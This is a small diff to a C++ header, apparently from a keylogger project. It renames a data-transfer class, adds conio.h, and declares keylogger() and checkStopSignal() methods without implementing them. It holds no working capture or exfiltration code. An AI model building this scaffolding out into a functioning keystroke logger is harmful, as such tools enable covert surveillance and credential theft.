@@ -4,8 +4,9 @@
 #include <string>
 #include <vector>
 #include <memory>
+#include <conio.h>
 
-class KeyloggerObject : public DataTransferObj
+class KLG_TransferObj : public DataTransferObj
 {
 public:
 	
@@ -17,7 +18,7 @@ public:
 	// Convert data object to a file
 	std::string toFile(std::string filename) = 0;
 
-
-
+	std::string keylogger();
+	bool checkStopSignal();
 
 };
